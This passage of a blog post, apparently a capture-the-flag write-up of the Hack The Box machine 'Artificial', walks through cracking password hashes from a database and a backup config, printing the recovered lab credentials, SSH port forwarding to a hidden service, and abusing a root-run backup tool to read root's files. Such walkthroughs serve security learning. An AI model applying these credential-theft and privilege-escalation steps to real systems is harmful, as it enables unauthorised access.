+<p>I was in, but as a low-privileged user. Time to escalate.</p>
+<hr>
+<h2 id="lateral-movement-finding-user-credentials">Lateral Movement: Finding User Credentials</h2>
+<p>Exploring the filesystem, I discovered a SQLite database in the <code>/instance</code> directory. This database contained user credentials - a goldmine for lateral movement.</p>
+<p>Inside, I found a hash for user <code>gael</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>c99175974b6e192936d97224638a34f8</code></pre></div>
+<p>This MD5 hash cracked easily using hashcat:</p>
+<p><strong>Credentials:</strong></p>
+<ul>
+<li>Username: <code>gael</code></li>
+<li>Password: <code>mattp005numbertwo</code></li>
+</ul>
+<p>I switched to the <code>gael</code> user and gained proper shell access via SSH for better stability.</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-6.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-6.png, /f0dh1l/images/htb_artificial/image-6.png 1.5x, /f0dh1l/images/htb_artificial/image-6.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-6.png"
+        title="Getting User Flag" /></p>
+<hr>
+<h2 id="privilege-escalation-the-path-to-root">Privilege Escalation: The Path to Root</h2>
+<p>After stabilizing my access, I checked my group memberships and noticed something interesting:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-7.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-7.png, /f0dh1l/images/htb_artificial/image-7.png 1.5x, /f0dh1l/images/htb_artificial/image-7.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-7.png"
+        title="User groups" /></p>
+<p>The <code>sysadm</code> group stood out. I immediately searched for files accessible by this group:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-8.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-8.png, /f0dh1l/images/htb_artificial/image-8.png 1.5x, /f0dh1l/images/htb_artificial/image-8.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-8.png"
+        title="Finding sysadm files" /></p>
+<p>And GG! A backup file at <code>/var/backups/backrest_backup.tar.gz</code> was readable by the <code>sysadm</code> group. I downloaded this archive to my local machine for analysis.</p>
+<h3 id="analyzing-the-backup">Analyzing the Backup</h3>
+<p>Extracting the backup revealed the source code and configuration for a backup service called &ldquo;Backrest&rdquo;. While digging through the <code>.config</code> directory, I found what appeared to be a base64-encoded bcrypt hash:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP</code></pre></div>
+<p>After decoding i got this which seems like a bcrypt hash</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO</code></pre></div>
+<p>after cracking, I obtained the password for <code>backrest_root</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>!@#$%^</code></pre></div>
+<h3 id="discovering-the-hidden-service">Discovering the Hidden Service</h3>
+<p>Examining <code>install.sh</code> within the backup revealed that Backrest runs a web interface on port <code>9898</code>, but only on localhost. This explained why I hadn&rsquo;t seen it during my initial port scan.</p>
+<p>To access this service, I set up SSH port forwarding:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 9898:127.0.0.1:9898 gael@artificial.htb</span></span></code></pre></div></div>
+<p>Now I could access the Backrest interface from my browser at <code>http://localhost:9898</code>.</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-9.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-9.png, /f0dh1l/images/htb_artificial/image-9.png 1.5x, /f0dh1l/images/htb_artificial/image-9.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-9.png"
+        title="Backrest login" /></p>
+<p>Logging in with <code>backrest_root:!@#$%^</code>, I gained access to the backup management interface.</p>
+<h3 id="exploiting-backrest-for-root-access">Exploiting Backrest for Root Access</h3>
+<p>The Backrest interface allowed me to create backup repositories and plans. More importantly, it could backup and restore arbitrary files on the system. Since the service likely ran as root (as backup services typically do), this was my ticket to reading the root flag.</p>
+<p><strong>Step 1:</strong> I created a new backup repository:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-11.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-11.png, /f0dh1l/images/htb_artificial/image-11.png 1.5x, /f0dh1l/images/htb_artificial/image-11.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-11.png"
+        title="Creating repository" /></p>
+<p><strong>Step 2:</strong> I created a backup plan targeting <code>/root/root.txt</code>:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-12.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-12.png, /f0dh1l/images/htb_artificial/image-12.png 1.5x, /f0dh1l/images/htb_artificial/image-12.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-12.png"
+        title="Creating backup plan" /></p>
+<p><strong>Step 3:</strong> I executed the backup:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-13.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-13.png, /f0dh1l/images/htb_artificial/image-13.png 1.5x, /f0dh1l/images/htb_artificial/image-13.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-13.png"
+        title="Executing backup" /></p>
+<p><strong>Step 4:</strong> I performed a restore operation to extract the backed-up files:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-14.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-14.png, /f0dh1l/images/htb_artificial/image-14.png 1.5x, /f0dh1l/images/htb_artificial/image-14.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-14.png"
+        title="Starting restore" />
+<img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-15.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-15.png, /f0dh1l/images/htb_artificial/image-15.png 1.5x, /f0dh1l/images/htb_artificial/image-15.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-15.png"
+        title="Restore in progress" /></p>
+<p><strong>Step 5:</strong> Finally, I downloaded the backup archive containing the root flag:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-16.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-16.png, /f0dh1l/images/htb_artificial/image-16.png 1.5x, /f0dh1l/images/htb_artificial/image-16.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-16.png"
+        title="Downloading archive" /></p>
+<p>Extracting the archive revealed the coveted root flag:</p>
+<p><img
+        class="lazyload"
+        src="/f0dh1l/svg/loading.min.svg"
+        data-src="/f0dh1l/images/htb_artificial/image-17.png"
+        data-srcset="/f0dh1l/images/htb_artificial/image-17.png, /f0dh1l/images/htb_artificial/image-17.png 1.5x, /f0dh1l/images/htb_artificial/image-17.png 2x"
+        data-sizes="auto"
+        alt="/f0dh1l/images/htb_artificial/image-17.png"
+        title="Root flag obtained" /></p>
+<p>🎉 <strong>Machine pwned!</strong></p>
+<hr>
+<h2 id="conclusion">Conclusion</h2>
+<p>The &ldquo;Artificial&rdquo; machine provided an excellent learning experience showcasing:</p>
+<ol>
+<li><strong>Supply Chain Vulnerabilities</strong>: The danger of accepting user-uploaded models in ML applications</li>
+<li><strong>Environment Replication</strong>: How vulnerability exploitation often requires precise environment matching</li>
+<li><strong>Credential Discovery</strong>: Finding sensitive data in databases and configuration files</li>
+<li><strong>Group Privileges</strong>: Leveraging group memberships for information disclosure</li>
+<li><strong>Service Enumeration</strong>: Discovering internal services through configuration analysis</li>
+<li><strong>Privilege Escalation</strong>: Abusing backup service functionality to read privileged files</li>
+</ol>
+<p>This box emphasizes the importance of validating all user inputs, even seemingly innocuous files like ML models, and highlights how backup services can become attack vectors when improperly secured.</p>
+<hr>
+<p><strong>Thanks for reading! I hope you enjoyed it, Happy hacking! 🚀</strong></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-10-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;" data-via="Benhibafodhil" data-hashtags="HTB,Linux"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-hashtag="HTB"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;"><i data-svg-src="/f0dh1l/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/f0dh1l/posts/htb_artificial/" data-title="HTB Machine Writeup &#34;Artificial&#34;" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2ff0dh1l%2fposts%2fhtb_artificial%2f&amp;text=HTB%20Machine%20Writeup%20%22Artificial%22" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/f0dh1l/tags/htb/">HTB</a>,&nbsp;<a href="/f0dh1l/tags/linux/">Linux</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/f0dh1l/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/f0dh1l/posts/first-h1-bounty/" class="prev" rel="prev" title="My First H1 Bounty: From Open Redirect to Profile Manipulation"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>My First H1 Bounty: From Open Redirect to Profile Manipulation</a>
+            <a href="/f0dh1l/posts/htb_tombwatcher/" class="next" rel="next" title="HTB Machine Writeup &#34;TombWatcher&#34;">HTB Machine Writeup "TombWatcher"<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/f0dh1l/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/f0dh1l/css/custom.css"><script src="/f0dh1l/lib/lazysizes/lazysizes.min.js"></script><script src="/f0dh1l/lib/clipboard/clipboard.min.js"></script><script src="/f0dh1l/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/f0dh1l/js/theme.min.js"></script></body>
+</html>
